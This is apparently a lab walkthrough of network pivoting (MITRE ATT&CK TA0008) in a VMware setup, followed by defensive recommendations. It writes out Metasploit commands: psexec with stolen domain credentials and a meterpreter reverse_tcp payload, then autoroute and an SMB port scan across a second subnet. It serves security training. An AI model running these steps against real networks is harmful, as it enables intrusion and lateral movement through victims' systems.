# Pivoting (MITRE ATT&CK TA0008)

## Overview

Pivoting is a post-exploitation technique where an attacker uses a compromised machine to access systems on **another subnet that is not directly reachable** from the attacker’s original position.

In this lab, we simulate a segmented enterprise network:

* 🖥 Domain Controller (Subnet A)
* 🖥 Machine #1 (Dual-homed — 2 NICs)
* 🖥 Machine #2 (Subnet B)
* 🐧 Attacker (Kali Linux)

Machine #1 acts as a **bridge between two subnets**, simulating a misconfigured internal workstation or server.

---

# Lab Architecture

### Subnet A

* Domain Controller
* Machine #1 (NIC 1)

### Subnet B (VMnet7)

* Machine #1 (NIC 2)
* Machine #2

---

## Step 1 — Virtual Network Configuration

Using VMware:

**Edit → Virtual Network Editor**

Create a new virtual adapter:

* VMnet7
* Separate subnet

📸 Screenshot:

```
screenshots/virtual-Network-adapter-config.png
```

---

### Machine Configuration

**Machine #1**

* NIC 1 → Subnet A
* NIC 2 → VMnet7

📸

```
screenshots/machine1-2NICs.png
```

**Machine #2**

* Single NIC → VMnet7 only

📸

```
screenshots/machine2-1NICs.png
```

---

## Step 2 — Verify Connectivity

Enable ICMP inbound rule on Machine #2:

Windows Defender Firewall →
Inbound Rules →
Enable:

`File and Printer Sharing (Echo Request - ICMPv4-In)`

📸

```
screenshots/machine2-1NICs-inbound-rule.png
```

From Kali:

```bash
ping <Machine1-IP>
ping <Machine2-IP>
```

📸

```
screenshots/ping-confirmation.png
```

If replies are received, the lab is correctly segmented and reachable.

---

# Execution Phase

We now assume:

* Machine #1 is already compromised
* We have valid domain credentials

We use Metasploit for pivoting.

---

# Step 3 — Gain Initial Meterpreter Session

```bash
msfconsole
use exploit/windows/smb/psexec
```

Configure:

```bash
set RHOSTS <Machine1-IP>
set SMBDomain <domain>
set SMBUser <username>
set SMBPass <password>
set payload windows/x64/meterpreter/reverse_tcp
set target 2
run
```

If successful:

✔ Meterpreter session opened on Machine #1

📸

```
screenshots/metasploit-session-pivot1.png
```

---

# Step 4 — Enumerate Routes

Inside meterpreter:

```bash
route print
arp -a
```

This identifies:

* Internal networks
* Additional subnets accessible via Machine #1

---

# Step 5 — Add Route to Second Subnet

```bash
run autoroute -s <CIDR of subnet B>
run autoroute -p
```

This tells Metasploit:

> "To reach subnet B, route traffic through this session."

Background the session:

```bash
background
```

---

# Step 6 — Scan the Internal Subnet

Search for port scanner:

```bash
search portscan
use auxiliary/scanner/portscan/tcp
```

Configure:

```bash
set RHOSTS <Machine2-IP>
set PORTS 445
run
```

📸

```
screenshots/metasploit-session-pivot7.png
screenshots/metasploit-session-pivot8.png
screenshots/metasploit-session-pivot9.png
screenshots/metasploit-session-pivot10.png
screenshots/metasploit-session-pivot11.png
screenshots/metasploit-session-pivot12.png
```

If port 445 is open:

✔ SMB service reachable through pivot
✔ Network segmentation bypassed

---

# What Just Happened?

The attacker:

1. Compromised Machine #1
2. Used it as a routing point
3. Accessed a hidden subnet
4. Scanned internal systems not reachable directly

This simulates real-world scenarios where:

* Developers
* IT admins
* Jump hosts
* Misconfigured servers

bridge sensitive network zones.

---

# Why This Is Dangerous

Improper network segmentation allows attackers to:

* Move deeper into the environment
* Reach database servers
* Access backup networks
* Target OT/production systems

A single dual-homed host can break an entire security boundary.

---

# MITRE ATT&CK Mapping

**TA0008 – Lateral Movement**

Related techniques:

* T1021 – Remote Services
* T1570 – Lateral Tool Transfer
* T1090 – Proxy (Pivoting)

---

# Defensive Recommendations

### 1️⃣ Strict Network Segmentation

* Use firewalls between VLANs
* Avoid dual-homed systems

### 2️⃣ Monitor for Unusual Routing

* Internal traffic originating from workstations
* Unexpected SMB scans

### 3️⃣ Restrict SMB Between Subnets

* Block 445 across VLANs unless required

### 4️⃣ Least Privilege

* Prevent credential reuse across network tiers

---

# Key Takeaway

Pivoting demonstrates that:

> Compromising one internal machine often means compromising everything it can see.

Network segmentation without enforcement is not security.

---
